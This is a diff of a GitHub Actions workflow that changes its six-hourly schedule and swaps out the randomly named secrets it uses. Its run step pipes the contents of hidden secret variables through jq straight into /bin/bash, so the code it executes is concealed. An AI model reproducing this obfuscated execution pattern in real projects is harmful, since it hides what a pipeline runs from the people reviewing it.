@@ -3,7 +3,7 @@ name: miaoguojing1997
 on:
   workflow_dispatch:
   schedule:
-    - cron: '28 5/6 * * *'
+    - cron: '11 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,12 +12,12 @@ jobs:
       - uses: actions/checkout@v4
       - name: miaoguojing1997
         env:
-          bwb4: ${{ secrets.bwb4 }}
+          w710: ${{ secrets.w710 }}
         run: |
-          echo $bwb4 | jq -r .pmjpd02672 | /bin/bash
-          echo $fejs09611 | jq -r .mnu22345 | /bin/bash
-          echo $wlk72 | jq -r .sfb6 | /bin/bash
-          echo $z6402 | jq -r .zekxq29304 | /bin/bash
-          echo $qi26 | jq -r .ajf005 | /bin/bash
-          echo $hiho06509 | jq -r .ay79 | /bin/bash
+          echo $w710 | jq -r .eqdz14 | /bin/bash
+          echo $jmgg4191 | jq -r .ayoh13 | /bin/bash
+          echo $uz77970 | jq -r .vt71367 | /bin/bash
+          echo $oggoz205 | jq -r .yemu140 | /bin/bash
+          echo $fze580 | jq -r .rnti7 | /bin/bash
+          echo $pl99232 | jq -r .gayr50 | /bin/bash
 
